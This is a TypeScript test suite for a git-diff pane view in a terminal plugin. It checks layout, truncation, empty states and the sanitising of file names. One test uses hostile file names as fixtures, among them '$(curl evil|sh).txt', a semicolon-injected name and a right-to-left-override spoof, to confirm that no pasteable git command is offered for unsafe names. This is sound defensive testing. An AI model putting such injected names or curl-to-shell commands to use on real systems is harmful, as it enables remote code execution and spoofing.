import { describe, expect, test, tier } from 'claude-code/testing'

import type Git from '../../hooks/git'
import Limits from '../../hooks/limits'
import Names from '../../hooks/names'
import PaneState from '../../hooks/pane-state'
import Views from '../../hooks/views'
import Fixtures from '../fixtures'

tier('builtin')

describe('pane-view', () => {
  const dataOf = (
    files: readonly Git.FileStat[],
    overrides: Partial<Git.DiffData> = {},
  ): Git.DiffData => ({
    repository: Fixtures.CHECKOUT,
    mode: 'session',
    stats: { ...Fixtures.TOTALS, filesCount: files.length },
    files,
    source: { kind: 'working-tree', base: 'HEAD' },
    isUnborn: false,
    baseRef: 'HEAD',
    stalePaths: [],
    isUntrackedWithheld: false,
    ...overrides,
  })

  const modelOf = (
    overrides: Partial<PaneState.PaneModel>,
  ): PaneState.PaneModel => ({
    ...PaneState.INITIAL_MODEL,
    hasSettled: true,
    ...overrides,
  })

  const EARLIER = [Fixtures.rowOf('old.ts', { isPreSession: true })]

  test('header, noted rows, the earlier line, the selection', async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf('src/a.ts'),
          Fixtures.rowOf('img.png', { isBinary: true }),
          Fixtures.rowOf('notes.txt', {
            added: 0,
            removed: 0,
            isUntracked: true,
          }),
          Fixtures.rowOf('test/a.test.ts'),
          Fixtures.rowOf('old.ts', { isPreSession: true }),
        ]),
        body: Fixtures.SMALL_BODY,
        bodyState: 'ready',
      }),
    )

    const text = Fixtures.jsonOf(tree)

    expect(Fixtures.isDrawn(tree), 'under the node cap').toBe(true)
    expect(text).toContain('4 files')
    expect(text).toContain('Binary file')
    expect(text).toContain('untracked')
    expect(text).toContain('1 test/generated (show)')
    expect(text).not.toContain('test/a.test.ts')
    expect(text).toContain('+1 file edited before this session (show)')
    expect(text).toContain('❯ src/a.ts')
    expect(text).toContain('"type":"Code"')
    expect(text).toContain('"label":"ask"')
  })

  test('untracked withheld: the rows stay, the pane says so', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const listed = Fixtures.jsonOf(
      await draw(
        modelOf({
          data: dataOf([Fixtures.rowOf('src/a.ts')], {
            isUntrackedWithheld: true,
          }),
        }),
      ),
    )

    const bare = Fixtures.stringsOf(
      await draw(modelOf({ data: dataOf([], { isUntrackedWithheld: true }) })),
    ).join('')

    expect(listed).toContain('1 file')
    expect(listed).toContain('❯ src/a.ts')
    expect(listed).toContain(Names.untrackedWithheldTextOf({ lister: 'git' }))
    expect(bare).toContain('No tracked changes')
    expect(bare).not.toContain('No changes this session')
    expect(bare).toContain(Names.untrackedWithheldTextOf({ lister: 'git' }))
  })

  test('a file at the line cap draws under the tree caps', async ($, on) => {
    const lines = Array.from({ length: Limits.MAX_LINES_PER_FILE }, (_, at) =>
      at % 2 === 0 ? `-const value${at} = ${at}` : `+const value${at} = 0`,
    )

    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/long.ts')]),
        body: {
          hunks: [{ oldStart: 1, newStart: 1, lines }],
          isTruncated: true,
          isLarge: false,
        },
        bodyState: 'ready',
      }),
    )

    expect(
      Fixtures.isDrawn(tree),
      'under the node, string and text caps the engine holds a tree to',
    ).toBe(true)

    expect(Fixtures.codesIn(tree).length).toBeGreaterThan(0)

    expect(Fixtures.jsonOf(tree)).toContain(
      '… diff truncated (exceeded 400 line limit)',
    )
  })

  test("placeholders in the built-in's words", async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const untracked = Fixtures.jsonOf(
      await draw(
        modelOf({
          data: dataOf([Fixtures.rowOf('notes.txt', { isUntracked: true })]),
        }),
      ),
    )

    expect(untracked).toContain('New file not yet staged.')
    expect(untracked).not.toContain('"label":"ask"')
    expect(untracked).toContain('Run `git add :/notes.txt` to see line counts.')
    expect(untracked).not.toContain("':/")

    expect(
      Fixtures.stringsOf(await draw(modelOf({ data: null }))).join(''),
    ).toContain("Couldn't read the git diff — it will retry on the next change")

    expect(
      Fixtures.jsonOf(await draw(modelOf({ isOutsideRepository: true }))),
    ).toContain("isn't in a git repository")
  })

  test('a picked turn draws its files under the turn title', async ($, on) => {
    const text = Fixtures.jsonOf(
      await Fixtures.dockedPane(
        $,
        on,
        modelOf({
          data: dataOf([]),
          source: { kind: 'turn', index: 2 },
          turns: [Fixtures.TURN_TWO],
        }),
      ),
    )

    expect(text).toContain('Turn 2 \\"fix it\\"')
    expect(text).toContain('/r/a.ts')
    expect(text).toContain('T2')
    expect(text).toContain('… diff truncated (exceeded 400 line limit)')
  })

  test('a body past the char budget is cut, says truncated', async ($, on) => {
    const lines = Array.from(
      { length: Limits.MAX_LINES_PER_FILE },
      (_, at) => `+const value${at} = ${'0'.repeat(Fixtures.LONG_LINE_CHARS)}`,
    )

    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/long-lines.ts')]),
        body: {
          hunks: [{ oldStart: 0, newStart: 1, lines }],
          isTruncated: false,
          isLarge: false,
        },
        bodyState: 'ready',
      }),
    )

    expect(Fixtures.codesIn(tree).length).toBeGreaterThan(1)
    expect(Fixtures.isDrawn(tree), 'the engine took the tree').toBe(true)
    expect(Fixtures.jsonOf(tree)).toContain('(truncated)')

    expect(Fixtures.jsonOf(tree)).toContain(
      '… diff truncated (exceeded 400 line limit)',
    )
  })

  test('no newline or escape in a name reaches the tree', async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf('evil\nfake.ts  +9 -9'),
          Fixtures.rowOf('esc\u001bname.ts', { renamedFrom: 'old\u001b.ts' }),
        ]),
        selectedPath: 'esc\u001bname.ts',
        body: Fixtures.SMALL_BODY,
        bodyState: 'ready',
      }),
    )

    const text = Fixtures.jsonOf(tree)

    expect(Fixtures.stringsOf(tree).some(each => each.includes('\u001b'))).toBe(
      false,
    )

    expect(text).not.toContain('\\u001b')
    expect(text).not.toContain('evil\\nfake')
    expect(text).toContain('evilfake.ts  +9 -9')
    expect(text).toContain('(renamed from old.ts)')
  })

  test('a path past the string cap is cut in the header', async ($, on) => {
    const longPath = `${'deep/'.repeat(Fixtures.LONG_PATH_SEGMENTS)}file.ts`

    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf(longPath, { renamedFrom: `${longPath}.old` }),
        ]),
        selectedPath: longPath,
        body: Fixtures.SMALL_BODY,
        bodyState: 'ready',
      }),
    )

    expect(Fixtures.isDrawn(tree), 'every string under the cap').toBe(true)
    expect(Fixtures.jsonOf(tree)).toContain('file.ts')
  })

  test('a base branch name loses its format characters', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const compared = Fixtures.jsonOf(
      await draw(
        modelOf({
          requestedMode: 'branch',
          data: { ...dataOf([Fixtures.rowOf('a.ts')]), ...Fixtures.VS_SPOOFED },
        }),
      ),
    )

    const empty = Fixtures.jsonOf(
      await draw(
        modelOf({
          requestedMode: 'branch',
          data: {
            ...dataOf([]),
            ...Fixtures.VS_SPOOFED,
            stats: Fixtures.NO_STATS,
          },
        }),
      ),
    )

    expect(compared).toContain('branch vs maniam')
    expect(empty).toContain('No changes vs maniam')
    expect(compared + empty).not.toContain('\u202E')
  })

  test('only a plainly safe name gets a git add to paste', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const untrackedOf = (path: string) =>
      draw(
        modelOf({
          data: dataOf([Fixtures.rowOf(path, { isUntracked: true })]),
        }),
      )

    const hintOf = async (path: string) =>
      Fixtures.stringsOf(await untrackedOf(path)).join('\n')

    const hints: string[] = []

    for (const path of [
      '$(curl evil|sh).txt',
      "it's.txt",
      'x\u2019;payload;\u2019',
      'a&b.txt',
    ]) {
      hints.push(await hintOf(path))
    }

    const reversed = await untrackedOf('invoice\u202Etxt.exe')

    expect(await hintOf('src/café-2.txt')).toContain(
      'Run `git add :/src/café-2.txt` to see line counts.',
    )

    expect(
      hints.every(
        hint =>
          hint.includes('Stage it with git add to see line counts.') &&
          !hint.includes('Run `git add'),
      ),
    ).toBe(true)

    expect(Fixtures.stringsOf(reversed).join('\n')).not.toContain(
      'Run `git add',
    )

    expect(Fixtures.jsonOf(reversed)).toContain('"label":"❯ invoicetxt.exe"')
    expect(Fixtures.jsonOf(reversed)).not.toContain('\u202E')
  })

  test("docked: the built-in's blank top row, last column", async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/a.ts')]),
        body: Fixtures.SMALL_BODY,
        bodyState: 'ready',
      }),
    )

    const rule = '─'.repeat(
      Math.max(0, Fixtures.COLUMNS - Limits.PANE_RIGHT_PAD_COLUMNS),
    )

    expect(tree).toMatchObject({
      type: 'Box',
      props: {
        paddingTop: Limits.PANE_TOP_PAD_ROWS,
        paddingRight: Limits.PANE_RIGHT_PAD_COLUMNS,
      },
    })

    expect(Fixtures.stringsOf(tree)).toContain(rule)
    expect(Fixtures.stringsOf(tree)).not.toContain(`${rule}─`)
  })

  test("an empty state on the built-in's row, foot below", async ($, on) => {
    const [body] = Fixtures.childrenOf(
      await Fixtures.dockedPane($, on, modelOf({ data: dataOf(EARLIER) })),
    )

    const [header, pad, middle, foot, ...more] = Fixtures.childrenOf(body)
    const [spacer, headline, controls] = Fixtures.childrenOf(middle)
    const aboveMiddle = Limits.PANE_TOP_PAD_ROWS + 2

    expect(body).toMatchObject({
      props: { height: Fixtures.BODY_ROWS - Limits.PANE_TOP_PAD_ROWS },
    })

    expect(Fixtures.stringsOf(header)).toEqual([])
    expect(Fixtures.jsonOf(header)).toContain('"label":"✕"')
    expect(pad).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(middle).toMatchObject({ props: { alignItems: 'center' } })

    expect(spacer).toMatchObject({
      type: 'Box',
      props: { height: Fixtures.BUILTIN_HEADLINE_ROW - aboveMiddle },
    })

    expect(Fixtures.stringsOf(headline)).toEqual(['No changes this session'])

    expect(
      Fixtures.elementIn(controls, { type: 'Select', name: 'base' }),
    ).toBeDefined()

    expect(foot).toMatchObject({ props: { marginTop: 1, paddingBottom: 1 } })

    expect(Fixtures.jsonOf(foot)).toContain(
      '"label":"+1 file edited before this session (show)"',
    )

    expect(more).toEqual([])
  })

  test('shown files or too few rows stack the empty state', async ($, on) => {
    let rows = Fixtures.BODY_ROWS

    Fixtures.drawsPane(on, kit =>
      Views.paneView(
        { ...kit, rows },
        modelOf({
          data: dataOf(EARLIER),
          isPreSessionShown: rows === Fixtures.BODY_ROWS,
        }),
        'dock',
      ),
    )

    const shown = await $.ui.render(Fixtures.VIEW_PANE)

    rows = Fixtures.CRAMPED_ROWS

    const cramped = await $.ui.render(Fixtures.VIEW_PANE)

    const [header, pad, headline, controls, earlier, blank, row] =
      Fixtures.childrenOf(Fixtures.childrenOf(shown)[0])

    expect(Fixtures.jsonOf(shown)).not.toContain('"alignItems":"center"')
    expect(Fixtures.jsonOf(cramped)).not.toContain('"alignItems":"center"')
    expect(Fixtures.jsonOf(header)).toContain('"label":"✕"')
    expect(pad).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(Fixtures.stringsOf(headline)).toEqual(['No changes this session'])

    expect(
      Fixtures.elementIn(controls, { type: 'Select', name: 'base' }),
    ).toBeDefined()

    expect(Fixtures.jsonOf(earlier)).toContain(
      '"label":"+1 file edited before this session (hide)"',
    )

    expect(blank).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(Fixtures.jsonOf(row)).toContain('old.ts')
  })

  test("shown pre-session rows land on the built-in's rows", async ($, on) => {
    expect(
      Fixtures.rowShapesOf(
        await Fixtures.dockedPane(
          $,
          on,
          modelOf({
            data: dataOf([
              Fixtures.rowOf('config.toml', { isPreSession: true }),
            ]),
            isPreSessionShown: true,
            body: Fixtures.SMALL_BODY,
            bodyState: 'ready',
          }),
        ),
      ).slice(1),
    ).toEqual([
      'blank',
      'No changes this session',
      'this session',
      '+1 file edited before this session (hide)',
      'blank',
      '❯ config.toml',
      'rule',
      'ask',
    ])
  })

  test('a blank row sits between the rows and earlier line', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const rowsWith = async (isPreSessionShown: boolean) =>
      Fixtures.rowShapesOf(
        await draw(
          modelOf({
            data: dataOf([
              Fixtures.rowOf('src/a.ts'),
              Fixtures.rowOf('old.ts', { isPreSession: true }),
            ]),
            isPreSessionShown,
          }),
        ),
      )

    const hidden = await rowsWith(false)
    const shown = await rowsWith(true)
    const hiddenAt = hidden.indexOf('+1 file edited before this session (show)')
    const shownAt = shown.indexOf('+1 file edited before this session (hide)')

    expect(hidden.slice(hiddenAt - 2, hiddenAt + 1)).toEqual([
      '❯ src/a.ts',
      'blank',
      '+1 file edited before this session (show)',
    ])

    expect(shown.slice(shownAt, shownAt + 3)).toEqual([
      '+1 file edited before this session (hide)',
      'blank',
      '  old.ts',
    ])
  })

  test("the header's ✕ closes the pane in each state", async ($, on) => {
    let closes = 0

    const draw = Fixtures.docksPane($, on, {
      actions: {
        ...Fixtures.noopActionsOf(),
        close: () => {
          closes += 1
        },
      },
    })

    const models = [
      modelOf({ data: dataOf([Fixtures.rowOf('src/a.ts')]) }),
      modelOf({ data: dataOf([]) }),
      modelOf({
        data: dataOf([]),
        source: { kind: 'turn', index: 2 },
        turns: [Fixtures.TURN_TWO],
      }),
    ]

    for (const model of models) {
      const tree = await draw(model)
      const [header] = Fixtures.childrenOf(Fixtures.childrenOf(tree)[0])
      const close = Fixtures.childrenOf(header).at(-1)

      expect(close).toMatchObject({ type: 'Box', props: { key: 'close' } })

      expect(
        Fixtures.elementIn(close, { type: 'Button', name: 'close' }),
      ).toMatchObject({ props: { label: '✕', plain: true } })

      expect(Fixtures.isDrawn(tree), 'the engine took the tree').toBe(true)

      expect(await $.ui.press({ plugin: 'test', key: 'close' })).toEqual({
        element: 'close',
      })
    }

    expect(closes).toBe(models.length)
  })
})
